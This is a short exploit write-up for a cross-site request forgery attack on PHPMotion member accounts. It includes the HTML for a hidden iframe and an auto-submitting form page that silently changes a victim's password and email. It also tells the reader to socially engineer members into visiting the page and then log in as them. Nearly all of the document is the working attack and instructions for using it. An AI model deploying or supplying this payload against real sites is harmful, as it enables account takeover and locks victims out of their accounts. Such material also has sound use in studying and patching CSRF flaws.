Description: Change a member's password and/or email.
---------------------------------------------------------------------------------------------------


Social engineer a PHPMotion member to come to your web page with the following hidden iframe on
there, which pulls in the evil script from pwned.html. This will change the victim's password and email,
using their credentials.

We use a hidden iframe so the victim doesn't know their password was changed till it's to late. In
the pwned.html file I recreated the form on the PHPMotion change password/email. Javascript is used
to submit the form on page load.

Hidden iframe code:

	<iframe id="hiframe" style="visibility:hidden;display:none" src="pwned.html"></iframe>


Source of pwned.html file:

	<html>
	<head></head>
	<body onload="document.forms.invite.submit();">
	<form name="invite" action="http://demo.phpmotiontemplates.com/v2/default/password.php" method="post" class="UpdateProfileForm">
		<input type="hidden" name="submitted" value="yes" />
		<input type="password" name="password" value="password123" />
		<input type="text" name="email_address" size="36" value="NotYourEmail@anymore.com" />
		<input type="submit" value="Update settings" name="invite_fr" />
	</form>
	</html>


Once your victim has visited your evil page, You may now be able to log into their PHPMotion account,
using password "password123" and their email will be "NotYourEmail@anymore.com".
